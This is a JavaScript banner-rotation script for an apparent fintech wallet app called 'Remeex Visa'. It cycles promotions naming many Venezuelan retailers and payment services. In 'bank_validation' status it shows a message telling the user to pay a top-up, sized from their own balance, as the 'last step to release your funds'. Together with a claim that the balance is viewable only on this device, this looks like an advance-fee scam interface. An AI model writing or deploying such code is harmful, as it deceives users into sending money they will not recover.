// Banner rotation and close logic

document.addEventListener('DOMContentLoaded', function () {
  const notice = document.getElementById('promo-banner');
  const closeBtn = document.getElementById('security-notice-close');
  const title = document.getElementById('promo-title');
  const text = document.getElementById('promo-text');
  const icon = document.getElementById('promo-icon');
  const fullImg = document.getElementById('promo-full-img');

  const promos = [
    { banner: 'img/Bannerremeexfamilia.png' },
    { banner: 'img/bannerremeexjovendevenezuela.png' },
    { banner: 'img/bannerremeexchicadevenezuela.png' },
    { banner: 'img/bannerremeexchav.png' },
    { banner: 'img/bannerremeexzelle.png' },
    { banner: 'soytechnoremeex.png' },
    { banner: 'farmatodoremeex.png' },
    { banner: 'Morgan Maxwell (2).png' },
    { banner: 'Morgan Maxwell (7).png' },
    { banner: 'westernremeexpromo.png' },
    { banner: 'multimaxremeexpromo.png' },
    { banner: 'clxsamsunpromo.png' },
    { banner: 'becoremeexpromo.png' },
    { banner: 'motosberapromo.png' },
    { banner: 'tarjetaremeex.png' },
    { banner: 'aunsoloclick.png' },
    { banner: 'zinliremeex.png' },
    { icon: 'fas fa-lock', title: 'Acceso Exclusivo a este Dispositivo', text: 'Por su seguridad, su saldo y transacciones solo est\u00e1n disponibles en este dispositivo donde ha iniciado sesi\u00f3n.' },
    { icon: 'fas fa-university', title: 'Abre tu Cuenta USA', text: 'Desde Servicios puedes obtener una cuenta en EEUU y activar tu Zelle.' },
    { icon: 'fas fa-mobile-alt', title: 'Compra un Tel\u00e9fono', text: 'Adquiere tu pr\u00f3ximo tel\u00e9fono usando tu saldo en Remeex Visa.' },
    { icon: 'fas fa-exchange-alt', title: 'Intercambia Fondos', text: 'Env\u00eda y recibe dinero con otros usuarios de la app.' },
    { icon: 'fas fa-money-bill-wave', title: 'Retira Efectivo', text: 'Solicita retiros en efectivo cuando lo necesites.' },
    { icon: 'fas fa-piggy-bank', title: 'Crea Botes de Ahorro', text: 'Organiza tu dinero y ahorra desde la aplicaci\u00f3n.' },
    { icon: 'fas fa-wallet', title: 'Env\u00eda a otras Wallets', text: 'Mueve tu dinero a cualquier billetera externa f\u00e1cilmente.' },
    { icon: 'fas fa-hand-holding-usd', title: 'Pagos y Donaciones', text: 'Paga servicios o realiza donaciones con tus criptomonedas.' },
    { icon: 'fas fa-coins', title: 'Cambio de Divisas', text: 'Convierte tus fondos en diferentes monedas al instante.' },
    { img: 'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgal8gKkws3Arvh_T8Ml4-L-uQvRg7LsvKuFAWWlBgj8dj1kMeHvnvBZVUaVl81xuzLOG9D_uFtr3gkAClGSiqkjaJv5L7RAm46vLDjFqlO2x0bXI6CF5zPAiN5hRPb5-3MrvVsOAOLBYh5-V_E1ypbwl2zUFd8S0LPxzMZrJEqMYjwOWsA88vc_E20bZ0/s320/IMG-20250627-WA0025.png', title: 'Nuevo Samsung Fold 7', text: 'Estrena el Samsung Fold 7 pagando con tu saldo en Latinphone.' },
    { img: 'https://www.sambilonline.com/media/logo/stores/1/logo_sambil.webp', title: 'Compra en Sambil', text: 'Disfruta de tus marcas favoritas en Sambil usando Remeex Visa.' },
    { img: 'https://beravirtual.com/wp-content/uploads/2024/08/Logo-Beramotorcycles_1.png', title: 'Tu Primera Moto Bera', text: 'Lleva tu moto Bera y p\u00e1gala con tu saldo Remeex Visa.' },
    { img: 'https://runrun.es/wp-content/uploads/2024/08/cashea3-1024x768.jpg', title: 'Compras con Cashea', text: 'Realiza compras ilimitadas financiadas con Cashea.' },
    { img: 'https://www.becoenlinea.com/wp-content/uploads/2024/02/Logo-BECO-1024x737.png', title: 'Ropa de Marca con Beco', text: 'Viste con estilo pagando en Beco desde la app.' },
    { img: 'https://www.redticket.com.ve/assets/Logo_redticket.svg', title: 'Conciertos con Redticket', text: 'Adquiere entradas a tus eventos favoritos.' },
    { img: 'https://cdn.prod.website-files.com/627eccaab96d0621ae273f80/628d4094d0c58d3a70abfd84_rids.png', title: 'Traslados con Yummy Rides', text: 'Solicita taxis y traslados c\u00f3modamente.' },
    { img: 'https://cdn.prod.website-files.com/627eccaab96d0621ae273f80/67db11ce5629728b1c5320e3_logo%20yummy%20svg-p-1080.png', title: 'Comida y Medicinas con Yummy', text: 'Pide delivery directo a tu puerta.' },
    { img: 'https://www.ivoo.com/home_2-rJh.png', title: 'Tecnolog\u00eda con Ivoo', text: 'Encuentra lo \u00faltimo en tecnolog\u00eda y paga con Remeex Visa.' },
    { img: 'https://images.seeklogo.com/logo-png/3/1/daka-logo-png_seeklogo-38224.png?v=1963052372322810720', title: 'Hogar con Daka', text: 'Equipa tu hogar en Daka utilizando tu saldo.' },
    { img: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQvMUC67h27GOPpKlwN9lUe00q2r2vYZErY-w&s', title: 'Electrodom\u00e9sticos en Damasco', text: 'Renueva tu casa con productos Damasco.' },
    { img: 'Logo_CLX_Group.png', title: 'Hogar Moderno con CLX Icons', text: 'Dise\u00f1o y mobiliario de vanguardia para tu hogar.' },
    { img: 'https://static.wixstatic.com/media/4b4152_90de5fac769c488f856bfc3770e89a9d~mv2.jpg/v1/fill/w_150,h_150,al_c,q_80,usm_0.66_1.00_0.01,enc_avif,quality_auto/Image-empty-state.jpg', title: 'Alta Gama con SoyTechno', text: 'Obt\u00e9n smartphones de alta gama en SoyTechno.' },
    { img: 'https://static.wixstatic.com/media/15a47a_d0099a8264554b30b715d7c338f8e34e~mv2.png/v1/fill/w_150,h_150,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/Image-empty-state.png', title: 'M\u00e1s Tecnolog\u00eda con Canguro', text: 'Explora una gran variedad de productos tecnol\u00f3gicos con Canguro.' },
    { img: 'https://www.logo.wine/a/logo/Binance/Binance-Logo.wine.svg', title: 'Retira tus fondos a Binance', text: 'Transfiere f\u00e1cilmente tus fondos a tu cuenta Binance.' },
    { img: 'https://1000logos.net/wp-content/uploads/2020/07/Western-Union-Logo-500x281.png', title: 'Env\u00eda con Western Union', text: 'Env\u00eda dinero r\u00e1pido con Western Union.' },
    { img: 'https://s3-eu-west-1.amazonaws.com/tpd/logos/61bb38efff4dedb88e94fbe6/0x0.png', title: 'Recibe con Zinli', text: 'Transfiere saldo directamente a tu cuenta Zinli.' },
    { img: 'https://images.seeklogo.com/logo-png/38/1/airtm-logo-png_seeklogo-389814.png', title: 'Usa Airtm', text: 'Maneja tus fondos de forma segura con Airtm.' },
    { img: 'https://upload.wikimedia.org/wikipedia/commons/thumb/5/50/MoneyGram_Logo.svg/512px-MoneyGram_Logo.svg.png', title: 'Env\u00eda con MoneyGram', text: 'Realiza remesas a trav\u00e9s de MoneyGram.' },
    { img: 'https://zoom.red/wp-content/uploads/2021/01/Logo-Zoom-Registrado.png', title: 'Env\u00edos con Zoom', text: 'Env\u00eda dinero a Venezuela mediante Zoom.' },
  ];

  if (typeof verificationStatus !== 'undefined' && verificationStatus.status === 'bank_validation') {
    const amtUsd = getVerificationAmountUsd(currentUser.balance.usd || 0);
    const amtBs = amtUsd * CONFIG.EXCHANGE_RATES.USD_TO_BS;
    promos.unshift({
      icon: 'fas fa-shield-alt',
      title: 'Valida tu Cuenta',
      text: `Realiza una recarga por ${formatCurrency(amtUsd, 'usd')} (${formatCurrency(amtBs, 'bs')}) desde tu cuenta registrada. Es el \u00faltimo paso para liberar tus fondos.`
    });
  }

  // Asegurar que los banners que son im\u00e1genes aparezcan primero
  const imagePromos = promos.filter(p => p.banner);
  const nonImagePromos = promos.filter(p => !p.banner);
  promos.length = 0;
  promos.push(...imagePromos, ...nonImagePromos);

  let promoIndex = 0;

  function showPromo(index) {
    const p = promos[index];
    if (!p) return;
    if (p.banner) {
      notice.classList.add('full-image');
      if (fullImg) {
        fullImg.src = p.banner;
        fullImg.style.display = 'block';
      }
      if (icon) icon.style.display = 'none';
      if (title) title.style.display = 'none';
      if (text) text.style.display = 'none';
      if (closeBtn) closeBtn.style.display = 'none';
    } else {
      notice.classList.remove('full-image');
      if (fullImg) fullImg.style.display = 'none';
      if (icon) {
        icon.style.display = 'flex';
        if (p.img) {
          icon.innerHTML = `<img src="${p.img}" alt="logo">`;
        } else {
          icon.innerHTML = `<i class="${p.icon}"></i>`;
        }
      }
      if (title) {
        title.style.display = 'block';
        title.textContent = p.title;
      }
      if (text) {
        text.style.display = 'block';
        text.textContent = p.text;
      }
      if (closeBtn) closeBtn.style.display = 'block';
    }
  }

  if (notice) {
    showPromo(promoIndex);
    setInterval(() => {
      promoIndex = (promoIndex + 1) % promos.length;
      showPromo(promoIndex);
    }, 10000);
  }

  if (closeBtn && notice) {
    closeBtn.addEventListener('click', function () {
      notice.style.display = 'none';
      localStorage.setItem('securityNoticeClosed', 'true');
      if (typeof resetInactivityTimer === 'function') {
        resetInactivityTimer();
      }
    });
  }
});
